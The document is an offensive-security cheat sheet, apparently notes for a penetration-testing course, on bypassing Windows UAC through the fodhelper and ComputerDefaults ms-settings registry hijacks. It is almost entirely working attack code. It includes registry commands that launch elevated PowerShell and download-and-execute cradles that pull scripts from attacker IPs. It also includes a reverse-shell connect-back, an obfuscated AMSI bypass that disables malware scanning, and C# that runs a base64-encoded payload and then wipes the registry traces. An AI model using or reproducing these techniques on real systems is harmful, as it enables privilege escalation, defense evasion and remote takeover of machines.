## Resources
- https://medium.com/@xNEED/user-account-control-uac-bypass-f4be7a410f23
- https://github.com/Octoberfest7/OSEP-Tools/blob/main/uacbypass.ps1
- https://github.com/0xyg3n/UAC_Exploit/tree/main

## Troubleshoot
Some AV's may terminate the entire ms-settings key if malicious behaviour is detected which will break any related settings. 
```powershell
# Rebuild key
reg add "HKCU\Software\Classes\ms-settings" /ve /d "" /f
```

# Fodhelper
Standard Execution
```powershell
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe

# Meterpreter exploit
use exploit/windows/local/bypassuac_fodhelper
```

AMSI Bypass embedded in a PS1 shellcode runner
```powershell
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.45.235:7711/Invoke-Runner.ps1') | IEX" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe

# Meterpreter exploit
use exploit/windows/local/bypassuac_fodhelper
```
Connect back to powercat listener
```powershell
# Attacking System
simplecat-tcp -l -p 9001 -Verbose

# Add line to end of SimpleCat-TCP.ps1
SimpleCat-TCP -c 192.168.45.230 -p 9001 -ep

# Embed AMSI bypass at top of SimpleCat-TCP script if required
Function Invoke-GuiltySpark {$X="5492868772801748688168747280728187173688878280688776828";$Y="1173680867656877679866880867644817687416876797271";[Ref]."A`ss`Embly"."GET`TY`Pe"((0..37|%{[char][int](29+($X+$Y).Substring(($_*2),2))})-join'').GetField((38..51|%{[char][int](29+($X+$Y).Substring(($_*2),2))})-join'','NonPublic,Static').SetValue($null,$([Convert]::ToBoolean("True")))};Invoke-GuiltySpark

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.45.235:7711/SimpleCat-TCP.ps1') | IEX" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```
# ComputerDefaults
ComputerDefaults.exe can be abused under similar circumstances as Fodhelper.exe in order to self elevate a medium integrity shell to that of a high integrity. 
Use UAC_UP.cs and embed the desired command to execute.
```csharp
// File: UAC_UP.cs
// Execute Base64 encoded commands with Powershell.
// The Below commands executes SimpleTCP-Cat.ps1 to catch a reverse shell as a high integirty shell
// Remember to embed a AMSI bypass into SimpleTCP-Cat.ps1 if required

string Execution = "powershell.exe -NoExit -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMwAwADoANwA3ADEAMQAvAFMAaQBtAHAAbABlAEMAYQB0AC0AVABDAFAALgBwAHMAMQAnACkAIAB8ACAASQBFAFgA"; // Execute what
                    Process.Start("CMD.exe", "/c start " + Execution);
                    RegistryKey uac_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
                    uac_clean.DeleteSubKeyTree("shell");
                    uac_clean.Close();
```
